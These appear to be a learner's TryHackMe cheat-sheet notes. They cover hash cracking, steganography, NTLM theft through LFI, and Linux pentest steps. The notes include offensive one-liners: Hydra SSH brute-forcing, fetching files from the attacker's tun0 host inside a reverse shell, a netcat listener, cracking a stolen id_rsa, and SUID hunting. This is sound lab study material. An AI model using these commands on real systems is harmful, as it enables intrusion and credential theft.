## 1. Cracking hashes 

- We can use the following :
     1. https://tunnelsup.com/hash-analyzer   - to check the hash type
     2. https://crackstation.net   - to crack easy hashes
     3. https://hashkiller.io/listmanager  - to crack hashes
     4. https://hashcat.net/wiki/doku.php?id=example_hashes - hashcat page
     5. https://www.youtube.com/watch?v=OFc0QNNhHOo
     6. https://bloggeroffer.blogspot.com/2023/10/tryhackme-write-ups-thm-walkthroughs.html   - note for the above video and using hashcat
     7. https://www.youtube.com/watch?v=IPZeg350Mrs - video best
     8. https://www.youtube.com/watch?v=euiuIzHaiLk - second best

## 2. OSINT - given a pic

- We can use the following sites to gather info about the picture :
     1. https://tineye.com/
     2. https://www.labnol.org/reverse/
     3. https://images.google.com/

- We can use a kali tool called *exiftool* - it tell us about the image more.
     - Syntax :    *exiftool  image_name* 
- To get words in a picture you can use :
     - *cat  image_name* 
     - *string  image_name* 
- To extract from image we can use :
     - *binwalk -e  image_name*

- We can use the following site to search for wifi.
     - https://wigle.net 
- Videos :
     1. https://www.youtube.com/watch?v=xZPhLEd-tek

## 3. Using Gobuster

- Check out this video :
     1. https://www.youtube.com/watch?v=lVUq3Z6BW-8
     2. https://www.geeksforgeeks.org/gobuster-penetration-testing-tools-in-kali-tools/

## 4. Using MySQL on terminal

- Check out this website :
     1. https://www.mysqltutorial.org/mysql-cheat-sheet/

## 5. Decoding or decrypting

- To decode or decrypt use the following sites :
     1. https://gchq.github.io/CyberChef/
     2. https://rot13.com/
     3. https://www.dcode.fr/rot-47-cipher
     4. https://morsecode.world/international/translator.html
     5. https://www.youtube.com/watch?v=EcX6LfaKV78

- *Spectrograms* : is a visual representation of the spectrum of frequencies of a signal as it varies with time. When applied to an audio signal, spectrograms are sometimes called sonographs, voiceprints, or voicegrams. When the data is represented in a 3D plot they may be called waterfalls.
     - We can use a tool called *sonic visualizer* in kali.
         1. open the app by going to the folder
         2. Go to layer and add spectrogram

- *Steganography* : is the practice of concealing a file, message, image, or video within another file, message, image, or video.
- Syntax :
     - To hide text 
         - *steghide embed  -ef  file_name  -cf  picture_name* 
     - To extract 
         - *steghide extract  -sf   picture_name* 

## 6. File that can be included on Windows

- Here we will exploit NTLM using Local file Inclusion (LFI) and this website gives as some common Windows domain names :
     - https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
 - To understand more about the include method check this website :
     - https://www.php.net/manual/en/function.include.php
 - To understand more about NTLM check this website :
     - https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/
 - Places to steal NTLM credentials, check this website :
     - https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds
 - Videos to watch :
     1. https://www.youtube.com/watch?v=qIsUCVvJ-3U
     2. https://www.youtube.com/watch?v=wq-najIgsRU

## 7. Basic Pentesting

- https://medium.com/@keraattin/basic-pentesting-room-tryhackme-2bb8b8946a92
- there is a video

- *Enum4linux* : is an enumeration tool capable of detecting and extracting data from *Windows* and *Linux* operating systems, including those that are *Samba (SMB)* hosts on a network. Enum4linux is capable of discovering the following: Password policies on a target. The operating system of a remote target.
- Syntax :
     - *enum4linux -a  target_ip  |  tee file_name*      -a = do everything   
- To see how to use enum4linux check this video :
     -  https://www.youtube.com/watch?v=yY9MuhlPiAk

- *Hydra* is an open-source tool that can perform rapid dictionary attacks against more than 50 protocols.
- Syntax :
     - *hydra  -l  user   -P  password_file  protocol://target_ip*   -l = specify user
     - Ex.  hydra -l   Jan   -P /usr/share/wordlists/rockyou.txt  ssh:// Ip_add
 - To see how to use hydra check this video :
     -  https://www.youtube.com/watch?v=FmsYThke6h8

- *Linpeas  GitHub* : is a privilege escalation script for Linux and there is also for Windows.
- Check this websites :
     1. https://github.com/peass-ng/PEASS-ng - to download it
     2. https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 
     3. When downloading it copy the python3 -c from the GitHub page.

- *Secure copy protocol (SCP)* is a means of securely transferring computer files between a local host and a remote host or between two remote hosts. It is based on the Secure Shell (SSH) protocol. 
- Syntax : 
     -  *scp  file_path    user@ Ip_add : destination_path*      we are using ssh
     - To use it on reverse shell
         1. start a server on any port
             - *python3  -m  http.server  8000* 
         2. go to your reverse shell and use wget to get it
             - *wget  http:// tun0_ip:port/file_name* 


- If we find the id_rsa of an ssh then we do the following :
     1. copy it and save it to a file
     2. change the mode (don't forget it)
         -  *chmod  600  file_name* 
     3. crack the password using john the ripper but first change it into a format john understands.
         -  *ssh2john  file_name  > file_name2* 
     4.  Now crack the password using john
         -  *john  file_name2   -w=path_to_wordlist* 
     6. log in using the id_rsa 
         -  *ssh  -i   file_name   user@ Ip_add*  then enter password u got from john.


## 8. Ignite - THM

- To upgrade our reverse shell, we do the following :
     -  *python -c  'import pty ; pty.spawn("/bin/bash")'*    no space btwn pty;pty

- Use *pentest monkey* to get codes to get reverse shell. 

- *rlwrap* is a readline wrapper, a small utility that uses the GNU Readline library to allow the editing of keyboard input for any command. This utility can be used in conjunction with netcat to gain a more stable reverse shell. 
- Syntax :
     -  *rlwrap nc -nlvp 4444* 
- For more info check this video :
     - https://www.youtube.com/watch?v=WizvitXOsLk


## 9. Publisher -THM

- We can brute force using ffuf 
- Syntax :
     -  *ffuf -u "http://10.10.111.189/FUZZ" -e .php,.txt -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100* 

- To find SUIDs in a system we use the command :
     -  *find / -perm /4000 2>/dev/null* 

- Resources for this CTF 
     - https://www.youtube.com/watch?v=Zju3pYmWTjs
     - https://musyokaian.medium.com/publisher-tryhackme-walkthrough-a256af21d7bd
     - https://www.youtube.com/watch?v=iOdsbF05k7s
     - https://swartzsego.medium.com/tryhackme-publisher-ctf-write-up-c9e1f8a352fb

## 10. Dav - THM

- To generate reverse shell online use :
     - https://www.revshells.com/

- Resources for this CTF :
     - https://www.youtube.com/watch?v=UDLqISuGiEY

